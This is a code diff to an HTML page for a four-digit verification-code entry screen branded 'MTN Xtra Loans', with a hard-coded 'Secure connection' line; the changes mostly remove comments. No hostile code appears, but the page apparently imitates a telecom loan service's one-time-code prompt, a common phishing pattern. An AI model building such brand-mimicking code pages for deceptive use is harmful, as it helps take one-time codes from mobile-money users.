@@ -8,7 +8,6 @@
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #eef2f5; margin: 0; padding: 40px 0; display: flex; flex-direction: column; min-height: 100vh; }
         
-        /* Main Content Container */
         .container {
             max-width: 500px;
             margin: 0 auto;
@@ -43,7 +42,6 @@
             margin-bottom: 30px;
         }
 
-        /* 4-Digit Input Boxes */
         .code-inputs {
             display: flex;
             justify-content: center;
@@ -71,11 +69,10 @@
             background-color: #fff;
         }
 
-        /* Action Button */
         .verify-btn {
             width: 100%;
             padding: 18px;
-            background-color: #ffe680; /* Faded yellow */
+            background-color: #ffe680;
             color: #999;
             border: none;
             border-radius: 12px;
@@ -119,7 +116,6 @@
 </head>
 <body>
 
-    <!-- MAIN CONTENT (Header removed) -->
     <div class="container">
         <div class="icon-circle">🔐</div>
         
@@ -141,7 +137,6 @@
             Didn't receive the code? <strong>Resend code</strong>
         </div>
 
-        <!-- UPDATED TEXT HERE -->
         <div class="secure-text">
             🔒 Secure connection to MTN Xtra Loans
         </div>
@@ -152,12 +147,11 @@
     </div>
 
     <script>
-        // Logic to handle input focus and button activation
         const inputs = document.querySelectorAll('.code-inputs input');
         const verifyBtn = document.getElementById('verifyBtn');
 
         function moveToNext(currentInput, nextInputId) {
-            // Keep only numbers
+            // This line ensures ONLY numbers can be typed or pasted
             currentInput.value = currentInput.value.replace(/[^0-9]/g, '');
 
             if (currentInput.value !== '' && nextInputId) {
@@ -181,7 +175,6 @@
             }
         }
 
-        // Handle backspace to go to previous input
         inputs.forEach((input, index) => {
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && input.value === '' && index > 0) {
